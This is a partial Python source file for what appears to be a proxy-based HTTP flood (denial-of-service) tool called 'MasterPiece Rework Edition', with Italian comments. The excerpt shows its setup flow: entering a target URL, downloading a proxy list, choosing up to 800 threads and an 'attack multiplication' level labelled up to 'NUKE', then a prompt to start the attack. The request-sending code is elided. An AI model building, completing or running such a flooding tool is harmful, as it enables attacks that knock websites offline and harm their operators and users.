...
\033[1;32m             ██████\033[39m 
 ...
 C0d3d by All3xJ - [\033[1;32mMASTERPIECE REWORK EDITION\033[39m - BY FISIC]''')
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	if choice1 == "1":
		...
		url = input(" \033[96m@MasterPiec3+>\033[93m TARGET URL: \033[39m").strip()

		if url == "":
			print (" \033[96m@MasterPiec3+>\033[31m PLEASE ENTER THE URL\033[39m")
			starturl()
...
def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		...
		out_file.close()
		print (" \033[96m@MasterPiec3+>\033[1;32m LIST DOWNLOADED SUCESSFULLY...\033[39m")
	except: # se succede qualche casino
		print (" \033[96m@MasterPiec3+>\033[31m ERROR DOWNLOADING LIST...\033[39m")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxylist():
	global proxies
	out_file = str(input(" \033[96m@MasterPiec3+>\033[93m ENTER THE LIST NAME [proxy.txt]\033[39m: "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input(" \033[96m@MasterPiec3+>\033[93m NUMBER OF THREADS [800]\033[39m: "))
	except ValueError:
		threads = 800
		print (" \033[96m@MasterPiec3+>\033[93m [800] THREADS SELECTED\033[39m")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input(" \033[96m@MasterPiec3+>\033[93m ATTACK MULTIPLICATION [1-5=NORMAL][50=POWERFUL][100 OR MORE=NUKE]: "))
	except ValueError:
		print (" \033[96m@MasterPiec3+>\033[31m YOU MISSTYPED, PLEASE TRY AGAIN\033[39m")
		multiplication()
	begin()
...
def begin():
	choice6 = input("\n\033[96m@MasterPiec3+>\033[31m PRESS ENTER TO START THE ATTACK: \033[39m")
	if choice6 == "":
		loop()
